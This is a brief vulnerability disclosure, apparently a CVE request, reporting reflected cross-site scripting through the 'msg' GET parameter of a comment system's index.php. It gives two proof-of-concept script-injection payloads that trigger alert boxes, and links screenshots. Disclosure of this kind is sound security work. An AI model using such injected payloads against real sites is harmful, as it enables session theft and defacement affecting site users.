BUG_Author: kanyulu

Vulnerability File: /Comment_System/index.php

GET parameter "msg" exists reflected cross-site scripting vulnerability

Payload1: msg=<script>alert('xss')</script>

![image](https://github.com/kanyl6/CVERequest/blob/main/1.png)

Payload2: msg=<script>alert(789)</script>

![image](https://github.com/kanyl6/CVERequest/blob/main/2.png)
